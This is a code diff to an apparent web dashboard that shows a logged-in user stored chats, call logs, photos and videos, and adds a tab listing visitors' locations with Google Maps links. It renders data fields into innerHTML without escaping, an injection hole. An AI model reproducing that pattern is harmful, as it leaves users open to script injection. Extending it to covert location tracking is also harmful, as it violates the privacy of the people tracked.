@@ -94,13 +94,14 @@
             <button class="tab-btn" onclick="filterLogs('call', this)">Calls</button>
             <button class="tab-btn" onclick="filterLogs('image', this)">Photos</button>
             <button class="tab-btn" onclick="filterLogs('video', this)">Videos</button>
+            <button class="tab-btn" onclick="filterLogs('location', this)">Locations</button>
         </div>
 
         <div id="logs-box"></div>
     </div>
 
     <script>
-        let allData = { chats: [], calls: [] };
+        let allData = { chats: [], calls: [], locations: [] };
         let currentFilter = 'all';
 
         async function handleLogin() {
@@ -122,6 +123,7 @@
                 if (result.success) {
                     allData.chats = result.chats || [];
                     allData.calls = result.calls || [];
+                    allData.locations = result.locations || [];
 
                     document.getElementById('login-container').style.display = 'none';
                     document.getElementById('history-container').style.display = 'flex';
@@ -159,6 +161,10 @@
                 combined = combined.concat(allData.calls.map(c => ({ ...c, type: 'call', category: 'call' })));
             }
 
+            if (currentFilter === 'all' || currentFilter === 'location') {
+                combined = combined.concat(allData.locations.map(c => ({ ...c, type: 'location', category: 'location' })));
+            }
+
             if (combined.length === 0) {
                 box.innerHTML = '<div style="text-align: center; color: rgba(255,255,255,0.5); margin-top: 40px;">No records found.</div>';
                 return;
@@ -172,6 +178,8 @@
                 let contentHtml = '';
                 if (item.category === 'call') {
                     contentHtml = `<strong>📞 Call Log:</strong> ${item.event}`;
+                } else if (item.category === 'location') {
+                    contentHtml = `<strong>📍 Visitor Location:</strong> ${item.event}<br><a href="${item.mapLink}" target="_blank" style="color:#a855f7; text-decoration:underline; display:inline-block; margin-top:5px;">Open in Google Maps 🗺️</a>`;
                 } else {
                     if (item.type === 'image') {
                         contentHtml = `<strong>📷 Photo Message:</strong><br><img src="${item.content}" alt="Image" />`;
